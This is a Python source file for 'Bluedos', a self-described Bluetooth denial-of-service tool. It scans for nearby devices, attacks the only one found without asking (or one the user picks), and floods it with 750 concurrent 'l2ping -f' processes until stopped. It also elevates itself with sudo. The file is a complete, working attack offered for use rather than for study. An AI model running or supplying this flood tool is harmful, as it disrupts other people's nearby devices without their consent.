#!/usr/bin/env python3.6
#  coding=utf-8
"""Bluedos by @ceigh

Easy Bluetooth devices DOS.
Wiki: gitlab.com/ceigh/bluedos/wikis

"""
import os
import subprocess as sp
from time import sleep

import interface


def bt_switcher(switched_times: list = [0]):
    """
    Check BT off or on and if it's off - up it.
    It calls two times - on startup and before exit - if it was enabled
    before startup, it will remain on after the script finishes. And if
    it was off, it turns off after the script finishes.

    :param switched_times: How many times BT on/off.
    List instead of int because it save statement.

    """
    if (switched_times == [0]) and \
            (not sp.check_output(['hcitool', 'dev'])[9:]):
        os.system("rfkill unblock bluetooth")
        sleep(0.4)
    elif switched_times[0] != 0:
        os.system("rfkill block bluetooth")
    switched_times[0] += 1


def get_devices() -> tuple:
    """
    Using hcitool scans devices around and forms them

    :return: (('00:00:00:00:00:00', 'Dev1'),
              ('11:11:11:11:11:11', 'Dev2'))

    """
    print("\033cScanning, please wait...\n")
    try:
        hcitool_out = sp.check_output(['hcitool', 'scan'])[13:-1]
        devices = tuple([tuple(i.split('\t')[1:])
                         for i in hcitool_out.decode().split('\n')
                         if len(hcitool_out) != 0])
        return devices
    except sp.CalledProcessError:
        exit("Plug bluetooth adapter first.")


def attack(target: tuple):
    """
    Attacks the selected device.
    Creates 750 processes l2ping.

    :param target: tuple with MAC (0) and name of device (1);
                   e.g: ('00:00:00:00:00:00', 'Dev1')

    """
    from signal import SIGTERM
    print(f"\033cTrying on '{target[1]}', please wait...")
    pids = tuple([sp.Popen(['l2ping', '-f', '-s', '660', target[0]],
                           stdout=sp.DEVNULL).pid
                  for p in range(750)])
    try:
        input(f"\033cAttacking '{target[1]}', press enter to stop... ")
    finally:
        [os.kill(pid, SIGTERM) for pid in pids]
        interface.bye()


def main():
    """
    First gets a list of devices, if they are not available, a
    re-scan is suggested. Then, depending on how many devices are
    found: if one is immediately attacked on it; if several - the user
    is asked to choose one of them and the attack is already on him.
    Also if on script launch bluetooth was off - it's blocking after
    job done and if it was working on launch - it still works after
    script done.

    """
    bt_switcher()
    devices = get_devices()
    dev_number = len(devices)
    if not devices:
        print("No devices around :(")
        if not interface.confirm("Scan again?"):
            interface.bye()
        else:
            main()
    elif dev_number == 1:
        attack(devices[0])
    else:
        print(f"\033c{dev_number} devices found:\n")
        [print(f"{index}) <{device[0]}>\t'{device[1]}'")
         for index, device in enumerate(devices)]
        print()
        target_i = None
        while target_i not in range(dev_number):
            try:
                target_i = int(input(f"Select device (0-{dev_number-1}): "))
            except ValueError:
                continue
            except (KeyboardInterrupt, EOFError):
                interface.bye()
                exit(0)
        attack(devices[target_i])
    bt_switcher()
    exit(0)


if __name__ == '__main__':
    if not os.getuid():  # Root launch check
        print(f'\033c{__doc__}')
        sleep(1)
        main()
    from sys import argv

    if not os.access(__file__, os.X_OK):
        os.system(f'sudo chmod +x {argv[0]}')
    os.system(f'sudo ./{argv[0]}')
